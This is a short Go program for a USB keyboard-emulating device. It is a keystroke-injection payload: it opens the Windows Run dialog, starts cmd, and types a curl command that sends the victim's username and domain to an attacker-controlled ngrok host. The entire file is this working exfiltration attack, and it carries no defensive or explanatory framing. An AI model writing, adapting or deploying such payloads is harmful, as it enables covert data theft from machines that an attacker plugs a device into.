package programs

import (
	"machine/usb/hid/keyboard"
)

// Open cmd and makes a request to a controlled website with username@domain

func Whoami() {

	kb := keyboard.Port()

	runs := 1
	for {
		if runs == 2 {
			break
		}
		runs += 1

		Sleep1Sec()

		kb.Down(keyboard.KeyModifierGUI)
		kb.Down(keyboard.KeyR)
		kb.Down(keyboard.KeyEnter)
		kb.Release()

		Sleep1Sec()

		kb.Write([]byte("cmd"))

		Sleep1Sec()

		kb.Press(keyboard.KeyEnter)

		Sleep1Sec()

		kb.Write([]byte("curl https://<ngrok>/%USERNAME%@%USERDOMAIN%"))

		Sleep1Sec()

		kb.Press(keyboard.KeyEnter)
	}
}
